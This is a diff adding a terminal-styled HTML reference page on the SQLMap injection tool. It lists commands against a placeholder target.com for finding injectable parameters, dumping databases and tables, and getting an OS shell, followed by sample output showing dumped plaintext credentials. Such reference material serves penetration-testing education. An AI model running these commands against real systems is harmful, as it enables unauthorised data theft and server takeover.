@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HackStack | SQLMap</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: #00ff9c;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    .header {
+      text-align: center;
+      padding: 20px;
+      border-bottom: 1px solid #00ff9c;
+      box-shadow: 0 0 10px #00ff9c;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 30px;
+    }
+
+    h2 {
+      border-left: 4px solid #00ff9c;
+      padding-left: 10px;
+      margin-top: 40px;
+    }
+
+    .terminal {
+      background: #020202;
+      border: 1px solid #00ff9c;
+      padding: 15px;
+      margin-top: 10px;
+      box-shadow: 0 0 12px #00ff9c;
+      white-space: pre-wrap;
+      font-size: 14px;
+    }
+
+    .inject-bar {
+      height: 4px;
+      background: linear-gradient(90deg, transparent, #00ff9c, transparent);
+      animation: inject 1.5s infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes inject {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .cmd {
+      color: #00ffaa;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 8px 16px;
+      border: 1px solid #00ff9c;
+      text-decoration: none;
+      color: #00ff9c;
+    }
+
+    .btn:hover {
+      background: #00ff9c;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <h1>SQLMAP</h1>
+  <p>Automated SQL Injection & Database Takeover Tool</p>
+</div>
+
+<div class="container">
+
+  <h2>What is SQLMap?</h2>
+  <p>
+    SQLMap is an open-source penetration testing tool that automates the process
+    of detecting and exploiting SQL injection vulnerabilities and taking over
+    database servers.
+  </p>
+
+  <div class="inject-bar"></div>
+
+  <h2>Common SQLMap Commands</h2>
+  <div class="terminal">
+<span class="cmd"># Test URL for SQL Injection</span>
+sqlmap -u "http://target.com/page.php?id=1"
+
+<span class="cmd"># Dump all databases</span>
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+<span class="cmd"># List tables in a database</span>
+sqlmap -u "http://target.com/page.php?id=1" -D users --tables
+
+<span class="cmd"># Dump table data</span>
+sqlmap -u "http://target.com/page.php?id=1" -D users -T accounts --dump
+
+<span class="cmd"># Get OS shell</span>
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+  </div>
+
+  <h2>Sample Exploitation Output</h2>
+  <div class="terminal">
+[INFO] testing connection to the target URL
+[INFO] testing if parameter 'id' is injectable
+[CRITICAL] parameter 'id' is vulnerable
+
+Database: users
+Table: accounts
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | admin    | admin123   |
+| 2  | test     | test@123   |
++----+----------+------------+
+  </div>
+
+  <h2>Attack Phase Mapping</h2>
+  <div class="terminal">
+[ Web Exploitation ] → SQL Injection detection  
+[ Database Enumeration ] → Tables, users, hashes  
+[ Privilege Escalation ] → OS shell, file read/write  
+  </div>
+
+  <a class="btn" href="tools.html">← Back to Tools</a>
+  <a class="btn" href="index.html">Home</a>
+
+</div>
+
+</body>
+</html>
